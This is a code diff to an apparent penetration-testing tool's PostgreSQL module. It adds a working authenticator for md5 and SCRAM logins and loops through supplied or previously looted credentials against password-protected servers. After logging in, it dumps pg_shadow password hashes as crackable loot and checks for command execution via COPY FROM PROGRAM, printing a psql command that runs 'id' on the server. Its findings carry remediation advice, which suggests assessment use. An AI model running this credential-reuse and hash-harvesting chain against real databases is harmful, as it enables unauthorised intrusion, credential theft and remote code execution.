@@ -11,6 +11,7 @@ modules (source="postgres").
 """
 from __future__ import annotations
 
+import hashlib
 import socket
 import struct
 
@@ -79,6 +80,72 @@ def _pg_error(body: bytes) -> str:
         if field[:1] == b"M":
             return field[1:].decode("utf-8", "replace")
     return "error"
+
+
+def _send(sock: socket.socket, tag: bytes, body: bytes) -> None:
+    sock.sendall(tag + struct.pack("!I", len(body) + 4) + body)
+
+
+def _do_auth(sock: socket.socket, user: str, password: str | None) -> bool:
+    """Complete a Postgres auth handshake (the caller has already sent StartupMessage).
+    Returns True on AuthenticationOk. Handles trust(0), cleartext(3), md5(5) and
+    SASL/SCRAM-SHA-256(10). `password` may be None for the trust-only path."""
+    typ, body = _read_message(sock)
+    if typ != b"R" or len(body) < 4:
+        return False
+    code = struct.unpack("!I", body[:4])[0]
+    if code == 0:                                    # AuthenticationOk (trust)
+        return True
+    if password is None:
+        return False
+    if code == 3:                                    # cleartext password
+        _send(sock, b"p", password.encode() + b"\x00")
+    elif code == 5:                                  # md5
+        salt = body[4:8]
+        inner = hashlib.md5((password + user).encode()).hexdigest().encode()
+        token = b"md5" + hashlib.md5(inner + salt).hexdigest().encode()
+        _send(sock, b"p", token + b"\x00")
+    elif code == 10:                                 # SASL (SCRAM-SHA-256)
+        mechs = [m.decode("ascii", "replace") for m in body[4:].split(b"\x00") if m]
+        if "SCRAM-SHA-256" not in mechs:
+            return False
+        from . import scram
+        client = scram.ScramClient(user, password, "SCRAM-SHA-256")
+        first = client.first_message().encode()
+        _send(sock, b"p", b"SCRAM-SHA-256\x00" + struct.pack("!I", len(first)) + first)
+        typ, body = _read_message(sock)             # expect R / SASLContinue (11)
+        if typ != b"R" or len(body) < 4 or struct.unpack("!I", body[:4])[0] != 11:
+            return False
+        final = client.final_message(body[4:].decode("utf-8", "replace")).encode()
+        _send(sock, b"p", final)
+        typ, body = _read_message(sock)             # SASLFinal (12) then AuthenticationOk
+        if typ != b"R" or len(body) < 4:
+            return False
+        code = struct.unpack("!I", body[:4])[0]
+        if code == 12:
+            client.verify(body[4:].decode("utf-8", "replace"))
+            typ, body = _read_message(sock)
+            if typ != b"R" or len(body) < 4:
+                return False
+            code = struct.unpack("!I", body[:4])[0]
+        return code == 0
+    else:
+        return False                                 # GSS/other: unsupported
+    typ, body = _read_message(sock)                  # cleartext/md5 -> AuthenticationOk
+    return typ == b"R" and len(body) >= 4 and struct.unpack("!I", body[:4])[0] == 0
+
+
+def authenticate(ip: str, port: int, user: str, password: str,
+                 timeout: float = _TIMEOUT, db: str = "postgres") -> bool:
+    """Try one credential against a Postgres endpoint. Returns True if it logs in. No
+    query is run; the connection is dropped right after AuthenticationOk."""
+    try:
+        with socket.create_connection((ip, port), timeout=timeout) as sock:
+            sock.settimeout(timeout)
+            sock.sendall(_startup(user, db))
+            return _do_auth(sock, user, password)
+    except (OSError, struct.error, ValueError):
+        return False
 
 
 def probe(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres") -> dict:
@@ -156,9 +223,11 @@ def _simple_query(sock: socket.socket, sql: str) -> list[list]:
     return rows
 
 
-def loot(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres") -> dict:
-    """Trust-auth confirmed -> pull read-only loot: databases, roles, and pg_shadow
-    password hashes (the postgres superuser can read them). SELECT only, no writes."""
+def loot(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres",
+         password: str | None = None) -> dict:
+    """Authenticated (trust, or with a supplied credential) -> pull read-only loot:
+    databases, roles, pg_shadow hashes and the connected role's RCE capability. A
+    superuser can read pg_shadow. SELECT only, no writes."""
     out = {"databases": [], "roles": [], "hashes": [], "current_user": user}
     try:
         sock = socket.create_connection((ip, port), timeout=timeout)
@@ -167,9 +236,8 @@ def loot(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres") 
         return out
     try:
         sock.sendall(_startup(user, "postgres"))
-        typ, body = _read_message(sock)
-        if typ != b"R" or (len(body) >= 4 and struct.unpack("!I", body[:4])[0] != 0):
-            return out                           # not trust after all
+        if not _do_auth(sock, user, password):
+            return out                           # auth failed
         _read_until_ready(sock)
         out["databases"] = [r[0] for r in _simple_query(
             sock, "SELECT datname FROM pg_database WHERE datistemplate=false ORDER BY 1")]
@@ -223,6 +291,25 @@ def loot(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres") 
     return out
 
 
+def _cred_list(creds) -> list[tuple]:
+    """Normalize the analyze() `creds` arg (a single dict, or a list of them) into
+    [(user, password), ...]. Accepts username/user + password/secret keys."""
+    if not creds:
+        return []
+    if isinstance(creds, dict):
+        creds = [creds]
+    out, seen = [], set()
+    for c in creds:
+        if not isinstance(c, dict):
+            continue
+        u = c.get("username") or c.get("user")
+        pw = c.get("password") if c.get("password") is not None else c.get("secret")
+        if u and pw is not None and (u, pw) not in seen:
+            seen.add((u, pw))
+            out.append((u, pw))
+    return out
+
+
 def postgres_targets(hosts: list[Host]) -> list[dict]:
     out = []
     for h in hosts:
@@ -252,57 +339,79 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
             ver = pr.get("version") or ""
             if pr.get("unauth"):
                 lt = pr.get("loot") or {}
-                loot_txt = ""
-                if lt:
-                    dbs = lt.get("databases", [])
-                    roles = lt.get("roles", [])
-                    hashes = lt.get("hashes", [])
-                    supers = [r["name"] for r in roles if r.get("super")]
-                    loot_txt = (
-                        f"\n\nLOOTED (read-only): {len(dbs)} database(s): "
-                        + ", ".join(dbs[:10])
-                        + f"; {len(roles)} role(s)"
-                        + (f" (superuser: {', '.join(supers[:5])})" if supers else "")
-                        + (f"; {len(hashes)} password hash(es) captured (crackable) -> "
-                           + ", ".join(h["user"] for h in hashes[:8]) if hashes else ""))
                 out.append(_finding(
                     "high", "PostgreSQL trust authentication (no password required)", tgt,
                     "The server accepted a v3 startup for user 'postgres' with NO "
                     "password (AuthenticationOk / `trust` in pg_hba.conf)"
                     + (f"; server_version {ver}" if ver else "")
-                    + ". Anyone who can reach this port has full database access." + loot_txt,
+                    + ". Anyone who can reach this port has full database access."
+                    + _loot_text(lt),
                     f"psql 'host={h.ip} port={p.portid} user=postgres dbname=postgres'",
                     "Replace `trust` in pg_hba.conf with scram-sha-256 (or md5); bind to "
                     "localhost / a private interface; require TLS for remote access.",
                     ["CWE-306", "CWE-287"], kind="pg_trust_auth"))
-                # Deeper: if that trust login is a superuser (or can COPY FROM PROGRAM),
-                # it is a CONFIRMED unauthenticated RCE, not just data access.
-                if lt.get("can_rce"):
-                    role = lt.get("current_user", "postgres")
-                    how = ("superuser" if lt.get("is_superuser")
-                           else "member of pg_execute_server_program")
-                    exts = lt.get("extensions") or []
-                    ext_txt = (f" Untrusted PL extensions installed: {', '.join(exts)}."
-                               if exts else "")
-                    filecap = []
-                    if lt.get("can_read_files"):
-                        filecap.append("arbitrary file read")
-                    if lt.get("can_write_files"):
-                        filecap.append("arbitrary file write")
-                    fc_txt = (" Also: " + " + ".join(filecap) + "." if filecap else "")
-                    out.append(_finding(
-                        "critical",
-                        "PostgreSQL unauthenticated RCE (trust-auth superuser -> COPY FROM PROGRAM)",
-                        tgt,
-                        f"The trust-auth role '{role}' is a {how}, so `COPY t FROM "
-                        "PROGRAM 'cmd'` executes OS commands as the postgres service "
-                        "account - unauthenticated remote code execution." + ext_txt + fc_txt,
-                        f"psql 'host={h.ip} port={p.portid} user={role} dbname=postgres' "
-                        "-c \"CREATE TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r;\"",
-                        "Never expose 5432; remove trust auth; run the app as a "
-                        "non-superuser; revoke pg_execute_server_program.",
-                        ["CWE-78", "CWE-306"], kind="pg_rce"))
+                _rce_finding(out, tgt, h.ip, p.portid, lt)
+            elif pr.get("cred_access"):
+                lt = pr.get("loot") or {}
+                who = pr.get("cred_user", "?")
+                out.append(_finding(
+                    "high", "PostgreSQL credentialed access (looted / weak credential)", tgt,
+                    f"recce logged in as '{who}' with a credential from the engagement"
+                    + (f"; server_version {ver}" if ver else "")
+                    + ". The account has database access." + _loot_text(lt),
+                    f"psql 'host={h.ip} port={p.portid} user={who} dbname=postgres'",
+                    "Rotate the credential; enforce least privilege; bind to a trusted "
+                    "interface; require TLS.",
+                    ["CWE-522", "CWE-284"], kind="pg_cred_access"))
+                _rce_finding(out, tgt, h.ip, p.portid, lt, credentialed=True, user=who)
     return out
+
+
+def _loot_text(lt: dict) -> str:
+    if not lt:
+        return ""
+    dbs = lt.get("databases", [])
+    roles = lt.get("roles", [])
+    hashes = lt.get("hashes", [])
+    supers = [r["name"] for r in roles if r.get("super")]
+    return (
+        f"\n\nLOOTED (read-only): {len(dbs)} database(s): " + ", ".join(dbs[:10])
+        + f"; {len(roles)} role(s)"
+        + (f" (superuser: {', '.join(supers[:5])})" if supers else "")
+        + (f"; {len(hashes)} password hash(es) captured (crackable) -> "
+           + ", ".join(x["user"] for x in hashes[:8]) if hashes else ""))
+
+
+def _rce_finding(out: list, tgt: str, ip: str, port: int, lt: dict,
+                 credentialed: bool = False, user: str = "postgres") -> None:
+    """Emit the COPY-FROM-PROGRAM RCE finding when the (trust or credentialed) role can
+    reach it. Shared by both auth paths."""
+    if not lt.get("can_rce"):
+        return
+    role = lt.get("current_user", user)
+    how = ("superuser" if lt.get("is_superuser")
+           else "member of pg_execute_server_program")
+    exts = lt.get("extensions") or []
+    ext_txt = f" Untrusted PL extensions installed: {', '.join(exts)}." if exts else ""
+    filecap = []
+    if lt.get("can_read_files"):
+        filecap.append("arbitrary file read")
+    if lt.get("can_write_files"):
+        filecap.append("arbitrary file write")
+    fc_txt = " Also: " + " + ".join(filecap) + "." if filecap else ""
+    lead = "credentialed" if credentialed else "unauthenticated"
+    src = "credentialed" if credentialed else "trust-auth"
+    out.append(_finding(
+        "critical",
+        f"PostgreSQL {lead} RCE ({src} superuser -> COPY FROM PROGRAM)", tgt,
+        f"The {'' if credentialed else 'trust-auth '}role '{role}' is a {how}, so "
+        "`COPY t FROM PROGRAM 'cmd'` executes OS commands as the postgres service "
+        f"account - {lead} remote code execution." + ext_txt + fc_txt,
+        f"psql 'host={ip} port={port} user={role} dbname=postgres' "
+        "-c \"CREATE TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r;\"",
+        "Never expose 5432; remove trust auth / rotate creds; run the app as a "
+        "non-superuser; revoke pg_execute_server_program.",
+        ["CWE-78", "CWE-306"], kind="pg_rce"))
 
 
 def runbook(ip: str, port: int) -> list[dict]:
@@ -334,13 +443,30 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                 t["unauth"] = pr.get("unauth", False)
                 t["auth_required"] = pr.get("auth_required", False)
                 t["version"] = pr.get("version", "") or t.get("version", "")
+                lt = None
                 if pr.get("unauth"):
-                    pr["loot"] = loot(t["ip"], t["port"])
-                    for hh in pr["loot"].get("hashes", []):
+                    lt = loot(t["ip"], t["port"])
+                    pr["loot"] = lt
+                    src, note = "postgres-loot", "pg_shadow hash from trust-auth PostgreSQL"
+                elif pr.get("auth_required"):
+                    # Credentialed follow-through: try each supplied/looted credential.
+                    for cred in _cred_list(creds):
+                        u, pw = cred
+                        if authenticate(t["ip"], t["port"], u, pw):
+                            pr["cred_access"] = True
+                            pr["cred_user"] = u
+                            lt = loot(t["ip"], t["port"], user=u, password=pw)
+                            pr["loot"] = lt
+                            t["cred_access"] = True
+                            src = "postgres-loot"
+                            note = f"pg_shadow hash via credentialed PostgreSQL ({u})"
+                            break
+                if lt:
+                    for hh in lt.get("hashes", []):
                         looted.append(Credential(
                             username=hh["user"], secret=hh["hash"], kind="hash",
-                            source="postgres-loot", origin_ip=t["ip"],
-                            notes=f"pg_shadow hash from trust-auth PostgreSQL :{t['port']}"))
+                            source=src, origin_ip=t["ip"],
+                            notes=f"{note} :{t['port']}"))
     fs = findings(hosts, probes)
     runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                  "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
